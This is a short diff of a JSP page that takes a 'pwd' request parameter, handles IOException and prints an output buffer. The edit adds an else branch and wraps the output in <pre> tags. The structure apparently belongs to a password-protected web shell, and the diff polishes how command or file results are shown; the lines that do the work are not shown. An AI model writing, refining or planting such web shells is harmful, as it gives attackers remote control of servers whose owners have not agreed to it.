@@ -1,4 +1,4 @@
-.<%@ page contentType="text/html; charset=GBK" %>
+<%@ page contentType="text/html; charset=GBK" %>
 <%@ page import="java.io.*" %>
 <%
     String pwd = request.getParameter("pwd");
@@ -15,6 +15,8 @@
         } catch(IOException e) {
             e.printStackTrace();
         }   
-    }   
-    out.println(output);
+    } else {
+        out.println("");
+    }
+    out.println("<pre>"+output+"</pre>");
 %>
